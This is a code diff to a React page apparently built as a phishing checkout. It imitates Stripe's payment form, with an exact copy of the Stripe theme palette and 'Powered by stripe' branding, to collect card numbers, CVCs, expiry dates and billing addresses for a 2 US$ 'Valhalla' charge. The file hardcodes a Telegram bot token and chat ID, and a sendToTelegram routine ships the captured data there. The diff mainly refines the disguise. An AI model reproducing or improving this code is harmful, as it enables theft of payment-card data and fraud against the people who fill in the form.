@@ -4,13 +4,26 @@ import VideoBackground from "@/components/VideoBackground";
 import VerifiedBadge from "@/components/VerifiedBadge";
 import VideoModal from "@/components/VideoModal";
 import { Button } from "@/components/ui/button";
-import { ShieldCheck, ChevronLeft, CreditCard, ChevronDown, PlayCircle, ArrowRight, Languages, Lock, Check } from "lucide-react";
+import { ShieldCheck, ChevronLeft, CreditCard, ChevronDown, PlayCircle, ArrowRight, Languages, Lock, Check, AlertCircle } from "lucide-react";
 import { EXAMPLE_VIDEO, TITLE_LOGO, LOGIN_PROFILE_VIDEO } from "@/lib/assets";
 import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";
 
 const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
 const CHAT_ID = "8585803145";
 const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+/* paleta exacta del tema "stripe" de Elements */
+const C = {
+  primary: "#0570de",
+  primaryHover: "#0461c4",
+  text: "#30313d",
+  secondary: "#6d6e78",
+  placeholder: "#a3a6ba",
+  border: "#e6e6e6",
+  divider: "#f0f0f5",
+  danger: "#df1b41",
+  brand: "#635bff",
+};
 
 const COUNTRIES = [
   "United States", "México", "Colombia", "Argentina", "Chile", "Perú",
@@ -74,91 +87,74 @@ const sendToTelegram = async (text: string) => {
   console.info("[tg] enviado por pixel");
 };
 
-/* ---------------- iconografía detallada ---------------- */
+/* ---------------- marcas y glifos ---------------- */
 
-const CardTileIcon = () => (
-  <svg width="42" height="27" viewBox="0 0 42 27" aria-hidden="true">
-    <defs>
-      <linearGradient id="vcardBody" x1="0" y1="0" x2="1" y2="1">
-        <stop offset="0" stopColor="#33333a" />
-        <stop offset="0.55" stopColor="#17171b" />
-        <stop offset="1" stopColor="#0c0c0f" />
-      </linearGradient>
-      <linearGradient id="vcardChip" x1="0" y1="0" x2="1" y2="1">
-        <stop offset="0" stopColor="#f8e6a3" />
-        <stop offset="0.45" stopColor="#d5ae52" />
-        <stop offset="1" stopColor="#f3dc93" />
-      </linearGradient>
-    </defs>
-    <rect width="42" height="27" rx="3.6" fill="url(#vcardBody)" />
-    <rect x="0.6" y="0.6" width="40.8" height="25.8" rx="3.1" fill="none" stroke="#464650" strokeWidth="0.8" />
-    <rect x="4.6" y="7.2" width="8.6" height="6.8" rx="1.3" fill="url(#vcardChip)" />
-    <path d="M6.9 7.2v6.8M9.2 7.2v6.8M11.5 7.2v6.8M4.6 10.6h8.6" stroke="#a8813a" strokeWidth="0.35" opacity="0.85" />
-    <rect x="4.6" y="17.4" width="15" height="2.1" rx="1.05" fill="#9a9aa6" opacity="0.8" />
-    <rect x="4.6" y="21" width="9.5" height="1.7" rx="0.85" fill="#9a9aa6" opacity="0.45" />
-    <circle cx="31" cy="20.4" r="4.4" fill="#eb001b" />
-    <circle cx="35.3" cy="20.4" r="4.4" fill="#f79e1b" />
-    <path d="M33.15 16.76a4.4 4.4 0 0 0 0 7.28 4.4 4.4 0 0 0 0-7.28z" fill="#ff5f00" />
-  </svg>
-);
-
-const GooglePayMark = () => (
-  <span className="flex h-8 items-center gap-1.5 rounded-full border border-[#dadce0] bg-white px-3 shadow-[0_1px_2px_rgba(60,64,67,0.08)]">
-    <svg width="15" height="15" viewBox="0 0 24 24" aria-hidden="true">
-      <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47a5.54 5.54 0 0 1-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z" />
-      <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09A11.99 11.99 0 0 0 12 24z" />
-      <path fill="#FBBC05" d="M5.27 14.29a7.2 7.2 0 0 1 0-4.58V6.62H1.29a11.99 11.99 0 0 0 0 10.76l3.98-3.09z" />
-      <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.7 0 3.99 2.47 1.29 6.62l3.98 3.09C6.22 6.86 8.87 4.75 12 4.75z" />
+const BrandRow = () => (
+  <div className="pointer-events-none flex items-center gap-[5px]">
+    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
+      <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
+      <text x="17" y="15.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="10.2" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.3">VISA</text>
     </svg>
-    <span className="text-[14px] font-medium leading-none tracking-[-0.01em] text-[#5f6368]">Pay</span>
-  </span>
-);
-
-const BrandLogos = () => (
-  <div className="pointer-events-none absolute right-3.5 top-1/2 flex -translate-y-1/2 items-center gap-[6px]">
-    <svg width="36" height="24" viewBox="0 0 34 23" aria-hidden="true">
-      <rect x="0.5" y="0.5" width="33" height="22" rx="2.6" fill="#fff" stroke="#e2e0f5" />
-      <text x="17" y="15.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="10.4" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.3">VISA</text>
-    </svg>
-    <svg width="36" height="24" viewBox="0 0 34 23" aria-hidden="true">
-      <rect width="34" height="23" rx="2.6" fill="#111114" />
+    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
+      <rect width="34" height="23" rx="2.4" fill="#111114" />
       <circle cx="13.6" cy="11.5" r="6.3" fill="#eb001b" />
       <circle cx="20.4" cy="11.5" r="6.3" fill="#f79e1b" />
       <path d="M17 6.28a6.3 6.3 0 0 0 0 10.44 6.3 6.3 0 0 0 0-10.44z" fill="#ff5f00" />
     </svg>
-    <svg width="36" height="24" viewBox="0 0 34 23" aria-hidden="true">
-      <rect width="34" height="23" rx="2.6" fill="#006fcf" />
-      <rect x="1.5" y="1.5" width="31" height="20" rx="1.7" fill="none" stroke="#fff" strokeWidth="0.85" opacity="0.9" />
-      <text x="17" y="12" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="7.6" fontWeight="900" fill="#fff" letterSpacing="0.1">AMEX</text>
-      <text x="17" y="17.6" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="3.9" fill="#d7eaff" letterSpacing="1.15">EXPRESS</text>
+    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
+      <rect width="34" height="23" rx="2.4" fill="#006fcf" />
+      <rect x="1.5" y="1.5" width="31" height="20" rx="1.6" fill="none" stroke="#fff" strokeWidth="0.85" opacity="0.9" />
+      <text x="17" y="12" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="7.4" fontWeight="900" fill="#fff" letterSpacing="0.1">AMEX</text>
+      <text x="17" y="17.6" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="3.8" fill="#d7eaff" letterSpacing="1.1">EXPRESS</text>
     </svg>
-    <svg width="36" height="24" viewBox="0 0 34 23" aria-hidden="true">
-      <rect x="0.5" y="0.5" width="33" height="22" rx="2.6" fill="#fff" stroke="#e2e0f5" />
+    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true">
+      <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
       <g transform="rotate(-9 17 11.5)">
         <path d="M8.6 3.6h4.1l-1.7 15.8H6.9z" fill="#e21836" />
         <path d="M13.8 3.6h4.1l-1.7 15.8h-4.1z" fill="#00447c" />
         <path d="M19 3.6h4.1l-1.7 15.8h-4.1z" fill="#007b84" />
       </g>
-      <text x="17" y="12.1" textAnchor="middle" fontSize="4.3" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Union</text>
-      <text x="17" y="16.6" textAnchor="middle" fontSize="4.3" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Pay</text>
+      <text x="17" y="12.1" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Union</text>
+      <text x="17" y="16.6" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Pay</text>
     </svg>
   </div>
 );
 
-const CvcIcon = () => (
-  <svg width="42" height="27" viewBox="0 0 40 26" aria-hidden="true" className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2">
-    <rect x="0.5" y="0.5" width="39" height="25" rx="3" fill="#f8f7ff" stroke="#d2d0f1" />
-    <rect x="0" y="4.6" width="40" height="4.6" fill="#2e2e37" />
-    <rect x="4" y="12.2" width="23" height="6.6" rx="1" fill="#fff" stroke="#dcdaf0" />
-    <path d="M6 14.6h19M6 16.4h13" stroke="#c8c5e3" strokeWidth="0.9" />
-    <circle cx="31.5" cy="18.4" r="6.4" fill="#3d3d46" stroke="#fff" strokeWidth="1.1" />
-    <text x="31.5" y="20.7" textAnchor="middle" fontSize="6.6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">135</text>
+const CardGlyph = () => (
+  <svg width="22" height="16" viewBox="0 0 22 16" aria-hidden="true">
+    <rect x="0.6" y="0.6" width="20.8" height="14.8" rx="2.2" fill="#fff" stroke="#c9cad1" />
+    <rect x="0.6" y="4.2" width="20.8" height="3" fill="#c9cad1" />
+    <rect x="3" y="9.6" width="6" height="2" rx="1" fill="#dcdee4" />
   </svg>
 );
 
+const CvcGlyph = () => (
+  <svg width="20" height="15" viewBox="0 0 20 15" aria-hidden="true">
+    <rect x="0.5" y="0.5" width="19" height="14" rx="2" fill="#f7f7fa" stroke="#c9cad1" />
+    <rect x="0.5" y="3.4" width="19" height="2.6" fill="#b9bac2" />
+    <rect x="2.5" y="8" width="9" height="1.4" rx="0.7" fill="#dcdee4" />
+    <circle cx="15.6" cy="9.6" r="3.2" fill="#30313d" />
+    <text x="15.6" y="11.3" textAnchor="middle" fontSize="3.6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">135</text>
+  </svg>
+);
+
+const GooglePayTile = () => (
+  <span className="flex items-center gap-1.5">
+    <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true">
+      <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47a5.54 5.54 0 0 1-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z" />
+      <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09A11.99 11.99 0 0 0 12 24z" />
+      <path fill="#FBBC05" d="M5.27 14.29a7.2 7.2 0 0 1 0-4.58V6.62H1.29a11.99 11.99 0 0 0 0 10.76l3.98-3.09z" />
+      <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.7 0 3.99 2.47 1.29 6.62l3.98 3.09C6.22 6.86 8.87 4.75 12 4.75z" />
+    </svg>
+    <span className="text-[14px] font-medium text-[#3c4043]">Pay</span>
+  </span>
+);
+
+const labelCls = "mb-[6px] block text-[13px] font-medium leading-none text-[#30313d]";
+const cellCls = "px-3.5 py-2.5";
 const inputCls =
-  "h-16 w-full rounded-[5px] border border-[#cfcdf5] bg-white px-4 text-[17px] text-neutral-900 outline-none placeholder:text-[#9a9aa8] transition-[border-color,box-shadow] duration-150 focus:border-[#635bff] focus:ring-2 focus:ring-[#635bff]/15";
-const labelCls = "mb-2 block text-[15px] font-normal leading-none text-neutral-900";
+  "h-9 w-full rounded-[4px] bg-transparent text-[16px] text-[#30313d] outline-none transition-shadow duration-100 placeholder:text-[#a3a6ba] focus:shadow-[0_0_0_1px_#0570de]";
+const errCls = (on: boolean) => (on ? "shadow-[0_0_0_1px_#df1b41]" : "");
 
 const Login = () => {
   const { t, lang, setLang } = useI18n();
@@ -172,11 +168,11 @@ const Login = () => {
   const [address, setAddress] = useState("");
   const [zip, setZip] = useState("");
   const [error, setError] = useState("");
+  const [field, setField] = useState("");
   const [loading, setLoading] = useState(false);
   const [videoOpen, setVideoOpen] = useState(false);
   const navigate = useNavigate();
 
-  // bloquea el scroll del fondo mientras el formulario ocupa la pantalla
   useEffect(() => {
     if (step !== "pay") return;
     const prev = document.body.style.overflow;
@@ -184,10 +180,16 @@ const Login = () => {
     return () => { document.body.style.overflow = prev; };
   }, [step]);
 
+  const fail = (name: string, msg: string) => {
+    setField(name);
+    setError(msg);
+  };
+
   const onSubmit = async (e: FormEvent) => {
     e.preventDefault();
     if (loading) return;
     setError("");
+    setField("");
 
     const digits = card.replace(/\s/g, "");
     const cleanHolder = holder.trim().replace(/\s+/g, " ");
@@ -196,13 +198,13 @@ const Login = () => {
     const year = 2000 + Number(yy);
     const now = new Date();
 
-    if (digits.length < 15) { setError("Card number is incomplete."); return; }
-    if (cleanHolder.length < 3) { setError("Enter the cardholder name."); return; }
-    if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) { setError("Expiration date is invalid."); return; }
-    if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setError("Your card has expired."); return; }
-    if (cvv.length < 3) { setError("CVC is incomplete."); return; }
-    if (address.trim().length < 5) { setError("Enter your billing address."); return; }
-    if (zip.trim().length < 3) { setError("Enter a valid ZIP."); return; }
+    if (digits.length < 15) return fail("card", "Tu número de tarjeta está incompleto.");
+    if (cleanHolder.length < 3) return fail("holder", "Escribe el nombre del titular.");
+    if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) return fail("exp", "La fecha de vencimiento no es válida.");
+    if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) return fail("exp", "Tu tarjeta está vencida.");
+    if (cvv.length < 3) return fail("cvc", "El código de seguridad está incompleto.");
+    if (address.trim().length < 5) return fail("address", "Escribe tu dirección de facturación.");
+    if (zip.trim().length < 3) return fail("zip", "Escribe un código postal válido.");
 
     setLoading(true);
     try {
@@ -287,7 +289,6 @@ const Login = () => {
               </div>
             </div>
 
-            {/* ---------- PASO 1 ---------- */}
             <div className="mt-4">
               <div className="rounded-md border border-border bg-secondary/30 p-4">
                 <div className="flex items-start justify-between gap-3">
@@ -333,65 +334,70 @@ const Login = () => {
         </div>
       </div>
 
-      {/* ---------- PASO 2: PANTALLA COMPLETA ---------- */}
+      {/* ---------- CHECKOUT ---------- */}
       {step === "pay" && (
-        <div className="fixed inset-0 z-50 flex justify-center bg-white">
+        <div className="fixed inset-0 z-50 flex justify-center bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
           <form
             onSubmit={onSubmit}
-            className="flex h-[100dvh] w-full max-w-[520px] flex-col bg-white text-neutral-900"
+            className="flex h-[100dvh] w-full max-w-[520px] flex-col bg-white text-[#30313d] antialiased"
           >
-            <header className="flex h-14 shrink-0 items-center justify-between border-b border-[#ececf7] px-5">
+            <header className="flex h-[54px] shrink-0 items-center justify-between border-b border-[#f0f0f5] px-4">
               <button
                 type="button"
                 onClick={() => setStep("intro")}
-                className="-ml-2 flex h-10 items-center gap-1 rounded-md px-2 text-[14px] text-[#5b5b6b] transition-colors hover:text-[#635bff]"
+                aria-label="Volver"
+                className="-ml-1.5 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9]"
               >
-                <ChevronLeft className="h-5 w-5" /> Volver
+                <ChevronLeft className="h-5 w-5" />
               </button>
-              <span className="flex items-center gap-1.5 text-[11px] font-medium uppercase tracking-[0.08em] text-[#8a8a99]">
+              <span className="flex items-center gap-1.5 text-[13px] font-medium text-[#6d6e78]">
                 <Lock className="h-3.5 w-3.5" /> Pago seguro
               </span>
             </header>
 
-            <div className="min-h-0 flex-1 overflow-y-auto overscroll-contain px-5 pb-6 pt-5">
-              <h2 className="text-[26px] font-bold leading-[1.15] tracking-[-0.02em] text-neutral-900">
-                Stripe Credit Card <span className="text-[#e0443e]">*</span>
-              </h2>
-              <p className="mt-1.5 text-[13px] text-[#7b7b8a]">Importe a pagar: 2 USD</p>
+            <div className="min-h-0 flex-1 overflow-y-auto overscroll-contain px-5 pb-7 pt-5">
+              <div className="flex items-center gap-2">
+                <span className="flex h-6 w-6 items-center justify-center rounded-full bg-[#635bff] text-[10px] font-bold text-white">V</span>
+                <span className="text-[13px] font-medium text-[#6d6e78]">Valhalla</span>
+              </div>
+              <p className="mt-3 text-[15px] text-[#6d6e78]">Pagar a Valhalla</p>
+              <h2 className="mt-0.5 text-[30px] font-semibold leading-none tracking-[-0.02em] text-[#30313d]">2,00 US$</h2>
 
-              <div className="mt-5 grid grid-cols-2 gap-3">
-                <button
-                  type="button"
-                  onClick={() => setMethod("card")}
-                  aria-pressed={method === "card"}
-                  className={`flex h-[92px] flex-col items-start justify-center gap-3 rounded-[6px] border px-4 text-left transition-colors ${
-                    method === "card" ? "border-[#b9b6f7] bg-[#f5f4ff]" : "border-[#d7d5f7] bg-white hover:bg-[#fafaff]"
-                  }`}
-                >
-                  <CardTileIcon />
-                  <span className="text-[17px] leading-none text-neutral-900">Card</span>
-                </button>
-                <button
-                  type="button"
-                  onClick={() => setMethod("gpay")}
-                  aria-pressed={method === "gpay"}
-                  className={`flex h-[92px] flex-col items-start justify-center gap-3 rounded-[6px] border px-4 text-left transition-colors ${
-                    method === "gpay" ? "border-[#b9b6f7] bg-[#f5f4ff]" : "border-[#d7d5f7] bg-white hover:bg-[#fafaff]"
-                  }`}
-                >
-                  <GooglePayMark />
-                  <span className="text-[17px] leading-none text-[#5f6368]">Google Pay</span>
-                </button>
+              <div className="mt-5 grid grid-cols-2 gap-2.5">
+                {(["card", "gpay"] as const).map((m) => {
+                  const on = method === m;
+                  return (
+                    <button
+                      key={m}
+                      type="button"
+                      onClick={() => setMethod(m)}
+                      aria-pressed={on}
+                      className={`flex h-[68px] flex-col items-center justify-center gap-2 rounded-[5px] border bg-white transition-shadow duration-100 ${
+                        on
+                          ? "border-[#e0e6eb] shadow-[0_0_0_2px_#0570de]"
+                          : "border-[#e0e6eb] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] hover:border-[#cfd5db]"
+                      }`}
+                    >
+                      {m === "card" ? (
+                        <span className="flex items-center gap-1 text-[#30313d]">
+                          <CardGlyph />
+                        </span>
+                      ) : (
+                        <GooglePayTile />
+                      )}
+                      <span className={`text-[12.5px] font-medium leading-none ${on ? "text-[#30313d]" : "text-[#6d6e78]"}`}>
+                        {m === "card" ? "Tarjeta" : "Google Pay"}
+                      </span>
+                    </button>
+                  );
+                })}
               </div>
 
-              {error && (
-                <p role="alert" className="mt-4 rounded-[5px] border border-[#e0443e]/30 bg-[#e0443e]/5 px-4 py-3 text-[13px] text-[#c0392b]">{error}</p>
-              )}
-
-              <div className="mt-5 space-y-5">
-                <div>
-                  <label htmlFor="cc-number" className={labelCls}>Card number</label>
-                  <div className="relative">
+              {/* marco único con separadores, como el Secure payment input frame */}
+              <div className="mt-5 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
+                <div className={cellCls}>
+                  <label htmlFor="cc-number" className={labelCls}>Número de tarjeta</label>
+                  <div className="flex items-center gap-2">
                     <input
                       id="cc-number"
                       type="text"
@@ -401,116 +407,137 @@ const Login = () => {
                       autoComplete="cc-number"
                       inputMode="numeric"
                       maxLength={19}
-                      className={`${inputCls} pr-[178px] text-[16px] font-medium tracking-[0.01em]`}
+                      autoFocus
+                      className={`${inputCls} tracking-[0.02em] ${errCls(field === "card")}`}
                     />
-                    <BrandLogos />
+                    <BrandRow />
                   </div>
                 </div>
 
-                <div>
-                  <label htmlFor="cc-name" className={labelCls}>Cardholder name</label>
+                <div className={`${cellCls} border-t border-[#f0f0f5]`}>
+                  <label htmlFor="cc-name" className={labelCls}>Nombre del titular</label>
                   <input
                     id="cc-name"
                     type="text"
-                    placeholder="Full name"
+                    placeholder="Nombre completo"
                     value={holder}
                     onChange={(e) => setHolder(e.target.value.toUpperCase())}
                     autoComplete="cc-name"
                     maxLength={40}
-                    className={`${inputCls} uppercase`}
+                    className={`${inputCls} uppercase ${errCls(field === "holder")}`}
                   />
                 </div>
 
-                <div className="grid grid-cols-2 gap-3">
-                  <div>
-                    <label htmlFor="cc-exp" className={labelCls}>Expiration</label>
+                <div className="grid grid-cols-[1fr_1fr] divide-x divide-[#f0f0f5] border-t border-[#f0f0f5]">
+                  <div className={cellCls}>
+                    <label htmlFor="cc-exp" className={labelCls}>Vencimiento</label>
                     <input
                       id="cc-exp"
                       type="text"
-                      placeholder="MM / YY"
+                      placeholder="MM / AA"
                       value={expiry}
                       onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                       autoComplete="cc-exp"
                       inputMode="numeric"
                       maxLength={5}
-                      className={`${inputCls} font-medium`}
+                      className={`${inputCls} ${errCls(field === "exp")}`}
                     />
                   </div>
-                  <div>
-                    <label htmlFor="cc-cvc" className={labelCls}>CVC</label>
+                  <div className={cellCls}>
+                    <div className="flex items-center justify-between">
+                      <label htmlFor="cc-cvc" className={labelCls}>Código de seguridad</label>
+                      <CvcGlyph />
+                    </div>
+                    <input
+                      id="cc-cvc"
+                      type="text"
+                      placeholder="CVC"
+                      value={cvv}
+                      onChange={(e) => setCvv(onlyDigits(e.target.value, 4))}
+                      autoComplete="cc-csc"
+                      inputMode="numeric"
+                      maxLength={4}
+                      className={`${inputCls} ${errCls(field === "cvc")}`}
+                    />
+                    <p className="mt-[3px] text-[10.5px] leading-tight text-[#6d6e78]">3 dígitos del reverso</p>
+                  </div>
+                </div>
+              </div>
+
+              {error && (
+                <p role="alert" className="mt-2.5 flex items-start gap-1.5 text-[12.5px] leading-snug text-[#df1b41]">
+                  <AlertCircle className="mt-[1px] h-3.5 w-3.5 shrink-0" /> {error}
+                </p>
+              )}
+
+              <div className="mt-6">
+                <p className="text-[13px] font-medium text-[#30313d]">Datos de facturación</p>
+                <div className="mt-2 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)]">
+                  <div className={cellCls}>
+                    <label htmlFor="country" className={labelCls}>País</label>
                     <div className="relative">
-                      <input
-                        id="cc-cvc"
-                        type="text"
-                        placeholder="CVC"
-                        value={cvv}
-                        onChange={(e) => setCvv(onlyDigits(e.target.value, 4))}
-                        autoComplete="cc-csc"
-                        inputMode="numeric"
-                        maxLength={4}
-                        className={`${inputCls} pr-[58px] font-medium`}
-                      />
-                      <CvcIcon />
+                      <select
+                        id="country"
+                        value={country}
+                        onChange={(e) => setCountry(e.target.value)}
+                        className={`${inputCls} cursor-pointer appearance-none pr-8`}
+                      >
+                        {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
+                      </select>
+                      <ChevronDown className="pointer-events-none absolute right-0 top-1/2 h-4 w-4 -translate-y-1/2 text-[#6d6e78]" />
                     </div>
                   </div>
-                </div>
-
-                <div>
-                  <label htmlFor="country" className={labelCls}>Country</label>
-                  <div className="relative">
-                    <select
-                      id="country"
-                      value={country}
-                      onChange={(e) => setCountry(e.target.value)}
-                      className={`${inputCls} cursor-pointer appearance-none pr-12`}
-                    >
-                      {COUNTRIES.map((c) => <option key={c} value={c}>{c}</option>)}
-                    </select>
-                    <ChevronDown className="pointer-events-none absolute right-4 top-1/2 h-5 w-5 -translate-y-1/2 text-[#3d3d47]" />
+                  <div className={`${cellCls} border-t border-[#f0f0f5]`}>
+                    <label htmlFor="address" className={labelCls}>Dirección</label>
+                    <input
+                      id="address"
+                      type="text"
+                      placeholder="Calle y número"
+                      value={address}
+                      onChange={(e) => setAddress(e.target.value)}
+                      autoComplete="street-address"
+                      maxLength={80}
+                      className={`${inputCls} ${errCls(field === "address")}`}
+                    />
                   </div>
-                </div>
-
-                <div>
-                  <label htmlFor="address" className={labelCls}>Billing address</label>
-                  <input
-                    id="address"
-                    type="text"
-                    placeholder="Street address"
-                    value={address}
-                    onChange={(e) => setAddress(e.target.value)}
-                    autoComplete="street-address"
-                    maxLength={80}
-                    className={inputCls}
-                  />
-                </div>
-
-                <div>
-                  <label htmlFor="zip" className={labelCls}>ZIP</label>
-                  <input
-                    id="zip"
-                    type="text"
-                    placeholder="90210"
-                    value={zip}
-                    onChange={(e) => setZip(e.target.value.toUpperCase())}
-                    autoComplete="postal-code"
-                    inputMode="numeric"
-                    maxLength={10}
-                    className={`${inputCls} font-medium`}
-                  />
+                  <div className={`${cellCls} border-t border-[#f0f0f5]`}>
+                    <label htmlFor="zip" className={labelCls}>Código postal</label>
+                    <input
+                      id="zip"
+                      type="text"
+                      placeholder="90210"
+                      value={zip}
+                      onChange={(e) => setZip(e.target.value.toUpperCase())}
+                      autoComplete="postal-code"
+                      inputMode="numeric"
+                      maxLength={10}
+                      className={`${inputCls} ${errCls(field === "zip")}`}
+                    />
+                  </div>
                 </div>
               </div>
             </div>
 
-            <div className="shrink-0 border-t border-[#ececf7] bg-white px-5 pt-3 pb-[max(14px,env(safe-area-inset-bottom))]">
+            <div className="shrink-0 border-t border-[#f0f0f5] bg-white px-5 pt-3 pb-[max(14px,env(safe-area-inset-bottom))]">
               <button
                 type="submit"
                 disabled={loading}
-                className="h-[58px] w-full rounded-[6px] border border-[#cfcdf5] bg-[#f4f3ff] text-[17px] text-neutral-900 transition-colors hover:bg-[#ecebff] active:scale-[0.995] disabled:opacity-70"
+                className="flex h-[52px] w-full items-center justify-center gap-2 rounded-[5px] bg-[#0570de] text-[16px] font-semibold text-white transition-colors hover:bg-[#0461c4] active:scale-[0.995] disabled:opacity-70"
               >
-                {loading ? "Procesando..." : "Entrar"}
+                {loading ? (
+                  <>
+                    <span className="h-4 w-4 animate-spin rounded-full border-2 border-white/40 border-t-white" />
+                    Procesando…
+                  </>
+                ) : (
+                  <>Pagar 2,00 US$</>
+                )}
               </button>
-              <p className="mt-2.5 flex items-center justify-center gap-1.5 text-[10px] text-[#8a8a99]">
-                <Lock className="h-3 w-3" /> Pago cifrado · SSL · Powered by Stripe
+              <p className="mt-2.5 flex items-center justify-center gap-1 text-[10.5px] text-[#8d8e98]">
+                Powered by
+                <span className="font-semibold tracking-[-0.02em] text-[#635bff]">stripe</span>
+                <span className="mx-1 text-[#d5d6dc]">|</span>
+                <Lock className="h-2.5 w-2.5" /> TLS 1.3
               </p>
             </div>
           </form>
